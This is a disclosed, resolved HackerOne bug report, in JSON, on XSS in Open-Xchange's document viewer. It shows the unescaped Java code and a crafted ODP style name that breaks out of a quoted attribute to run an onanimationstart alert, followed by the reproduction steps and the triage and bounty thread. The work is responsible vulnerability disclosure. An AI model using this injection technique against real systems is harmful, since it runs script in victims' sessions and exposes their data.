{"id":894918,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5MTg=","url":"https://hackerone.com/reports/894918","title":"XSS on opening malicious OpenOffice presentation document","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-09T22:37:51.965Z","submitted_at":"2020-06-09T22:37:51.965Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skr0x1c0","url":"/skr0x1c0","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T11:35:27.731Z","bug_reporter_agreed_on_going_public_at":"2020-09-24T07:56:51.541Z","team_member_agreed_on_going_public_at":"2020-11-23T11:35:27.629Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Title\nOpening a malicious OpenOffice presentation document may lead to cross site scripting (XSS) attacks\n\n# Description\nWhen generating HTML content for a master slides present in `odp` file, a `div` is generated by [Container.java](https://gitlab.open-xchange.com/documents/office/-/blob/develop/com.openexchange.office.htmldoc/src/com/openexchange/office/htmldoc/Container.java#L119). The attribute `data-container-id` of this `div` is directly constructed from the field `id` without any HTML escaping as shown below.\n\n``` java\npublic class Container extends NodeHolder {\n\n    private final String id;\n    ...\n\n    public Container(int index, String id, String target, boolean invisible, boolean notSelectable, JSONObject attrs) throws Exception {\n        this.index = index;\n        this.id = id;\n        ...\n    }\n\n    @Override\n    public boolean appendContent(StringBuilder document) throws Exception {\n        if (\"pagecontent\".equals(id)) {\n            document.append(\"\u003cdiv class='pagecontent'\");\n        } else {\n            document.append(\"\u003cdiv class='slidecontainer' data-container-id='\" + id + \"'\");\n            ...\n        }\n\n        document.append(\"\u003e\");\n        super.appendContent(document);\n        document.append(\"\u003c/div\u003e\");\n        return true;\n    }\n\n}\n```\n\nFor an OpenDocument presentation file, the `id` field is constructed from attribute `style:name` of the element `style:master-page`. This attribute may contain \"single quotes\" which can be used for injecting arbitary HTML code into the generated HTML. A `odp` document with `style.xml` file of following format will execute `alert(document.domain)` javascript code when user opens the document.\n\n``` xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003coffice:document-styles ...\u003e\n    ...\n    \u003coffice:master-styles\u003e\n        ...\n        \u003cstyle:master-page draw:style-name=\"dp1\"\n                           style:name=\"Default' style='animation-name: fa-spin' onanimationstart='alert(document.domain)\"\n                           style:page-layout-name=\"PM1\"\u003e\n            ...\n        \u003c/style:master-page\u003e\n    \u003c/office:master-styles\u003e\n\u003c/office:document-styles\u003e\n```\n\nThe generated HTML for the master slide is of following format\n``` xml\n\u003cdiv class='masterslidelayer'\u003e\n    \u003cdiv class='slidecontainer' data-container-id='Default' style='animation-name: fa-spin'\n         onanimationstart='alert(document.domain)'\n         jquerydata='...'\u003e\n        ...\n    \u003c/div\u003e\n    ...\n\u003c/div\u003e\n```\n\n# Steps to reproduce\n1. Upload attached `payload_container.odp` file to OX drive\n2. Open the `payload_container.odp` file. This will trigger an alert dialog with value `document.domain`\n\n## Impact\n\nThis XSS can execute arbitary javascript code without any user interaction when the user opens a maliciously crafted OpenOffice text document. This can be used for extracting and tampering user data (including encrypted documents) and executing other actions on user account like sending emails.","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861428,"file_name":"payload_container.odp","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8kDVEUF3xFoov8wzvWuzGQk4?response-content-disposition=attachment%3B%20filename%3D%22payload_container.odp%22%3B%20filename%2A%3DUTF-8%27%27payload_container.odp\u0026response-content-type=application%2Fvnd.oasis.opendocument.presentation\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153928Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8b2090c759b4ec3f9b7d7924a2ccb02a36d7e6cca27ee83d8919669136afb9bf","file_size":9682,"type":"application/vnd.oasis.opendocument.presentation"}],"allow_singular_disclosure_at":null,"vote_count":9,"voters":["secator","bombon","ali","aporlorxl23","what_web","h4x0r_dz","t3chn0phil3","grng3r","dsyync"],"severity":{"rating":"medium","score":4.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8269753,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-12T07:14:25.230Z","updated_at":"2020-06-12T07:14:25.230Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8269761,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-12T07:15:51.762Z","updated_at":"2020-06-12T07:15:51.762Z","additional_data":{"old_severity":"High (8.1)","new_severity":"Medium (4.6)","old_severity_id":745613,"new_severity_id":747610},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8269768,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report, we'll have a look!","automated_response":false,"created_at":"2020-06-12T07:16:50.720Z","updated_at":"2020-06-12T07:16:50.720Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8319652,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-06-17T12:28:17.225Z","updated_at":"2020-06-17T12:28:17.225Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skr0x1c0","url":"/skr0x1c0"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8319654,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-06-17T12:28:42.376Z","updated_at":"2020-06-17T12:28:42.376Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"skr0x1c0","url":"/skr0x1c0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8321755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","automated_response":false,"created_at":"2020-06-17T15:46:40.129Z","updated_at":"2020-06-17T15:46:40.129Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8321757,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","automated_response":false,"created_at":"2020-06-17T15:46:46.128Z","updated_at":"2020-06-17T15:46:46.128Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9315777,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since this bug is fixed in 7.10.4, can we disclose this report?","automated_response":false,"created_at":"2020-09-24T07:56:51.569Z","updated_at":"2020-09-24T07:56:51.569Z","first_to_agree":true,"actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9315807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes we will disclose this soon. We have some grace time to allow our users to upgrade their environments, sadly not everyone is on the latest and greatest version at all time. I plan to disclose this in mid-October.","automated_response":false,"created_at":"2020-09-24T08:00:47.654Z","updated_at":"2020-09-24T08:00:47.654Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9897182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This bug was disclosed on security advisory published in 13th October 2020 (https://seclists.org/fulldisclosure/2020/Oct/20).\n\nCan we disclose this report also?","automated_response":false,"created_at":"2020-11-23T11:26:28.760Z","updated_at":"2020-11-23T11:26:28.760Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897242,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-23T11:35:27.651Z","updated_at":"2020-11-23T11:35:27.651Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9897243,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-23T11:35:27.755Z","updated_at":"2020-11-23T11:35:27.755Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}